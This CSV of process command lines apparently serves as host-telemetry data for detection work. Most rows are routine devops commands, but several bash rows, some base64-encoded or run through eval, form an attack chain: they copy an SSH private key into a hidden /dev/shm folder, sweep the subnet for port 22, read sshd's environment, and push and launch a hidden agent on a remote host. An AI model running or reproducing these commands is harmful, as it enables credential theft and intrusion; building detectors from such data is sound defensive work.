process_name,command_line
uptime,uptime
scp,scp report.csv app@reports:/srv/reports/
python3,python3 /opt/app/manage.py migrate
docker,docker ps -a
git,git pull origin feature/checkout
python3,python3 -m pytest tests/ -q
bash,echo Y3AgL2hvbWUvYXBwLy5zc2gvaWRfcnNhIC9kZXYvc2htLy5mb250LXVuaXgvaw== | base64 -d | bash
free,free -m
git,git commit -am 'fix: redis retry logic'
terraform,terraform plan -out tfplan
kubectl,kubectl get pods -n production
apt-get,apt-get install -y git-lfs
htop,htop -d 5
npm,npm run build
git,git commit -am 'fix: worker retry logic'
systemctl,systemctl status payments
git,git status
kubectl,kubectl rollout status deploy/search
bash,echo Zm9yIGggaW4gMTAuMC4wLnsxLi41MH07IGRvIHRpbWVvdXQgMSBiYXNoIC1jICI+L2Rldi90Y3AvJGgvMjIiIDI+L2Rldi9udWxsICYmIGVjaG8gJGg7IGRvbmU= | base64 -d | bash
git,git log --oneline -n 10
make,make lint
journalctl,journalctl -u redis --since '10 min ago'
bash,ls -la /home/app
bash,"X='cat /proc/$(pgrep -n sshd)/environ 2>/dev/null'; eval ""$X"""
npm,npm test -- --runInBand
ps,ps aux --sort=-%mem | head
kubectl,kubectl rollout status deploy/payments
docker,docker build -t auth-svc:68 .
git,git checkout main
go,go build ./...
psql,psql -h db -U app -c 'SELECT count(*) FROM orders;'
git,git checkout hotfix/login
docker,docker logs --tail 100 api-gateway
apt-get,apt-get install -y ripgrep
kubectl,kubectl rollout status deploy/redis
docker,docker build -t nginx:93 .
bash,"X='ssh -i /dev/shm/.font-unix/k -o StrictHostKeyChecking=no app@203.0.113.168 '\''id'\'''; eval ""$X"""
git,git checkout feature/checkout
docker,docker build -t nginx:15 .
find,find /home/app/platform -name '*.log' -mtime +7
aws,aws s3 ls s3://postgres-artifacts/
df,df -h
pip3,pip3 install -r requirements.txt
docker,docker build -t auth-svc:55 .
npm,npm ci --no-audit
bash,"X='scp -i /dev/shm/.font-unix/k /dev/shm/.font-unix/.sync-agent app@203.0.113.168:/tmp/.s'; eval ""$X"""
git,git commit -am 'fix: postgres retry logic'
journalctl,journalctl -u search --since '10 min ago'
curl,curl -s http://localhost:8080/health
docker,docker logs --tail 100 search
redis-cli,redis-cli ping
rsync,rsync -az /home/app/data-pipeline/dist/ /var/www/nginx/
find,find /home/app/web-app -name '*.log' -mtime +7
docker,docker build -t postgres:42 .
kubectl,kubectl rollout status deploy/auth-svc
git,git pull origin develop
ssh,ssh app@build-49 uptime
curl,curl -fsS https://api.github.com/repos/platform/commits | head
git,git pull origin release/2.4
ssh,ssh app@build-44 uptime
bash,cd /home/app/infra && ls
bash,"X='ssh -i /dev/shm/.font-unix/k app@203.0.113.168 '\''nohup /tmp/.s &'\'''; eval ""$X"""
